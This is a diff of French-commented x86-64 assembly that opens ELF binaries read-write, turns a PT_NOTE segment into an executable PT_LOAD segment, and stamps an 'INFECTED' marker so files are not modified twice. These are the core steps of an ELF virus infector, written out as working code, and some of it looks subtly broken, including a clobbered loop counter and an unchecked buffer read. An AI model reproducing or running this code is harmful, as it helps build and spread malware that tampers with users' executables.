@@ -1,5 +1,5 @@
 section .data
-    magic_bytes db 0x7F, "ELF"    ; Signature ELF standard
+    magic_bytes db 0x7F, "ELF"    
     err_msg db "Ce n'est pas un fichier ELF valide", 10
     err_len equ $ - err_msg
     dir_msg db "C'est un répertoire", 10
@@ -8,133 +8,225 @@ section .data
     elf_len equ $ - elf_msg
     mod_msg db "Un segment PT_NOTE a été modifié en PT_LOAD avec les permissions RE", 10
     mod_len equ $ - mod_msg
+    already_mod_msg db "Ce fichier a déjà été modifié", 10
+    already_mod_len equ $ - already_mod_msg
+    signature db "INFECTED", 0     
+    sig_len equ $ - signature
     
 section .bss
     fd resq 1
     filename resq 1
     elf_header resb 64
     stat_buf resb 144
-    phdr resb 56          ; Structure pour stocker un program header
+    phdr resb 56          
+    note_data resb 1024   ; Buffer pour sauvegarder les données du segment NOTE
+    sig_buf resb 9        
 
 section .text
 global _start
 
 _start:
-    pop rdi                 ; Nombre d'arguments
-    pop rdi                 ; Nom du programme
-    pop rdi                 ; Premier argument (nom du fichier)
+    pop rdi                 
+    pop rdi                 
+    pop rdi                 
     mov [filename], rdi
     
-    ; Vérifier si c'est un répertoire
-    mov rax, 4             ; sys_stat
+    mov rax, 4             
     mov rsi, stat_buf
     syscall
     test rax, rax
     js exit
     
-    ; Vérifier le type de fichier
     mov rax, qword [stat_buf + 24]
     and rax, 0o170000
     cmp rax, 0o040000
     je is_directory
     
-    ; Ouvrir le fichier
     mov rdi, [filename]
-    mov rax, 2             ; sys_open
-    mov rsi, 2             ; O_RDWR pour pouvoir modifier le fichier
+    mov rax, 2             
+    mov rsi, 2             
     syscall
     cmp rax, 0
     jl exit
     mov [fd], rax
     
-    ; Lire l'en-tête ELF
     mov rdi, rax
-    mov rax, 0             ; sys_read
+    mov rax, 0             
     mov rsi, elf_header
     mov rdx, 64
     syscall
     
-    ; Vérifier la signature ELF
     mov rsi, elf_header
     mov rdi, magic_bytes
     mov rcx, 4
     repe cmpsb
     jne not_elf
     
-    ; Afficher que c'est un fichier ELF valide
     mov rax, 1
     mov rdi, 1
     mov rsi, elf_msg
     mov rdx, elf_len
     syscall
+
+    ; D'abord, chercher si le fichier a déjà été modifié
+    movzx rcx, word [elf_header + 56]  
+    mov rbx, 0                         
+
+check_if_modified:
+    cmp rbx, rcx
+    jge scan_headers      ; Si aucune signature trouvée, on continue avec la modification
+
+    ; Calculer l'offset du Program Header
+    movzx rax, word [elf_header + 54]  
+    mul rbx
+    add rax, qword [elf_header + 32]   
     
-    ; Parcourir les Program Headers
-    movzx rcx, word [elf_header + 56]  ; e_phnum (nombre de program headers)
-    mov rbx, 0                         ; Index du program header actuel
+    mov rdi, [fd]
+    mov rsi, rax                       
+    xor rdx, rdx                       
+    mov rax, 8                         
+    syscall
+    
+    mov rdi, [fd]
+    mov rax, 0                         
+    mov rsi, phdr
+    mov rdx, 56                        
+    syscall
+    
+    ; Lire la signature potentielle
+    mov rdi, [fd]
+    mov rsi, qword [phdr + 8]          ; p_offset
+    add rsi, qword [phdr + 32]         ; Aller à la fin du segment
+    sub rsi, sig_len                   ; Reculer de la taille de la signature
+    xor rdx, rdx
+    mov rax, 8                         
+    syscall
+    
+    mov rdi, [fd]
+    mov rax, 0                         
+    mov rsi, sig_buf
+    mov rdx, sig_len
+    syscall
+    
+    mov rsi, sig_buf
+    mov rdi, signature
+    mov rcx, sig_len
+    repe cmpsb
+    je file_already_modified    ; Si on trouve la signature, sortir directement
+    
+    inc rbx
+    jmp check_if_modified
 
 scan_headers:
+    ; Reset du compteur pour la recherche de PT_NOTE
+    movzx rcx, word [elf_header + 56]  
+    mov rbx, 0                         
+
+find_pt_note:
     cmp rbx, rcx
     jge exit
 
-    ; Calculer l'offset du Program Header
-    movzx rax, word [elf_header + 54]  ; e_phentsize
+    movzx rax, word [elf_header + 54]  
     mul rbx
-    add rax, qword [elf_header + 32]   ; e_phoff
+    add rax, qword [elf_header + 32]   
     
-    ; Lire le Program Header
     mov rdi, [fd]
-    mov rsi, rax                       ; Offset calculé
-    xor rdx, rdx                       ; SEEK_SET
-    mov rax, 8                         ; sys_lseek
+    mov rsi, rax                       
+    xor rdx, rdx                       
+    mov rax, 8                         
     syscall
     
     mov rdi, [fd]
-    mov rax, 0                         ; sys_read
+    mov rax, 0                         
     mov rsi, phdr
-    mov rdx, 56                        ; Taille d'un program header
+    mov rdx, 56                        
     syscall
     
-    ; Vérifier si c'est un PT_NOTE (type 4)
     mov eax, dword [phdr]
-    cmp eax, 4                         ; PT_NOTE
+    cmp eax, 4                         
     je modify_header
     
     inc rbx
-    jmp scan_headers
+    jmp find_pt_note
 
 modify_header:
-    ; Modifier le type en PT_LOAD (1)
-    mov dword [phdr], 1
+    ; Sauvegarder d'abord les données du segment NOTE
+    mov rdi, [fd]
+    mov rsi, qword [phdr + 8]         
+    xor rdx, rdx                       
+    mov rax, 8                         
+    syscall
     
-    ; Modifier les flags en RE (read + execute = 5)
+    mov rdi, [fd]
+    mov rax, 0                         
+    mov rsi, note_data
+    mov rdx, qword [phdr + 32]        
+    syscall
+    
+    ; Modifier le type en PT_LOAD
+    mov dword [phdr], 1
     mov dword [phdr + 4], 5           ; PF_R | PF_X
     
-    ; Écrire les modifications
+    ; Écrire le header modifié
     mov rdi, [fd]
-    movzx rax, word [elf_header + 54]  ; e_phentsize
+    movzx rax, word [elf_header + 54]  
     mul rbx
-    add rax, qword [elf_header + 32]   ; e_phoff
+    add rax, qword [elf_header + 32]   
     
     mov rdi, [fd]
     mov rsi, rax
     xor rdx, rdx
-    mov rax, 8                         ; sys_lseek
+    mov rax, 8                         
     syscall
     
     mov rdi, [fd]
-    mov rax, 1                         ; sys_write
+    mov rax, 1                         
     mov rsi, phdr
     mov rdx, 56
     syscall
     
-    ; Afficher le message de modification
+    ; Réécrire les données originales
+    mov rdi, [fd]
+    mov rsi, qword [phdr + 8]         
+    xor rdx, rdx
+    mov rax, 8                         
+    syscall
+    
+    mov rdi, [fd]
+    mov rax, 1                         
+    mov rsi, note_data
+    mov rdx, qword [phdr + 32]        
+    syscall
+    
+    ; Écrire la signature à la fin du segment
+    mov rdi, [fd]
+    mov rsi, qword [phdr + 8]         
+    add rsi, qword [phdr + 32]        
+    sub rsi, sig_len                  
+    xor rdx, rdx
+    mov rax, 8                         
+    syscall
+    
+    mov rdi, [fd]
+    mov rax, 1                         
+    mov rsi, signature
+    mov rdx, sig_len
+    syscall
+    
     mov rax, 1
     mov rdi, 1
     mov rsi, mod_msg
     mov rdx, mod_len
     syscall
-    
     jmp exit
+
+file_already_modified:
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, already_mod_msg
+    mov rdx, already_mod_len
+    syscall
+    jmp exit              ; Sortir immédiatement si le fichier est déjà modifié
 
 is_directory:
     mov rax, 1
@@ -153,10 +245,10 @@ not_elf:
     jmp exit
 
 exit:
-    mov rax, 3                         ; sys_close
+    mov rax, 3                         
     mov rdi, [fd]
     syscall
     
-    mov rax, 60                        ; sys_exit
+    mov rax, 60                        
     xor rdi, rdi
     syscall
